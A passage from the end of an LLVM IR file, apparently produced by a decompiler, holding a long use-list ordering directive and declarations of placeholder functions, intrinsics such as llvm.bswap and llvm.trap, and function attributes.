  uselistorder i32* @r4, { 54, 58, 12, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 55, 56, 57, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 9, 85, 86, 87, 88, 89, 90, 263, 14, 264, 13, 265, 266, 267, 91, 92, 15, 93, 94, 95, 16, 96, 17, 97, 98, 99, 100, 101, 8, 102, 0, 103, 104, 105, 1, 268, 272, 18, 4, 297, 298, 299, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 106, 107, 108, 109, 19, 110, 111, 112, 113, 114, 39, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 20, 162, 163, 164, 165, 166, 43, 44, 45, 149, 150, 41, 37, 151, 167, 168, 169, 170, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 5, 413, 346, 347, 348, 349, 350, 351, 352, 353, 354, 21, 355, 356, 375, 376, 377, 437, 438, 439, 378, 379, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 6, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 22, 24, 184, 23, 185, 460, 461, 462, 463, 466, 2, 464, 465, 10, 38, 467, 472, 473, 468, 469, 470, 471, 414, 415, 380, 25, 381, 382, 383, 26, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 200, 201, 202, 186, 187, 357, 358, 359, 360, 361, 362, 363, 364, 365, 27, 366, 367, 368, 369, 370, 371, 372, 373, 374, 300, 301, 302, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 556, 557, 416, 417, 418, 419, 420, 421, 422, 423, 424, 559, 560, 273, 274, 28, 7, 275, 257, 258, 259, 260, 261, 262, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 29, 394, 408, 409, 395, 396, 397, 398, 399, 405, 30, 406, 407, 403, 404, 400, 410, 411, 412, 276, 277, 278, 401, 402, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 425, 426, 427, 31, 428, 32, 429, 33, 430, 431, 432, 433, 434, 435, 436, 343, 344, 345, 303, 304, 305, 306, 269, 270, 271, 279, 280, 281, 34, 282, 283, 284, 35, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 11, 213, 214, 215, 216, 217, 218, 507, 508, 577, 509, 510, 580, 585, 586, 587, 588, 589, 590, 591, 578, 46, 47, 48, 49, 50, 51, 579, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 490, 493, 494, 495, 496, 491, 492, 233, 234, 497, 498, 499, 500, 501, 502, 229, 230, 231, 232, 235, 236, 237, 238, 239, 240, 581, 584, 241, 242, 243, 244, 511, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 36, 527, 528, 529, 530, 512, 513, 514, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 40, 544, 545, 3, 546, 547, 548, 549, 550, 551, 245, 246, 247, 582, 583, 42, 503, 504, 505, 506, 248, 249, 250, 251, 252, 253, 254, 255, 256, 552, 553, 554, 555, 52, 53, 558 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i8** @__decompiler_undefined_function_5() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
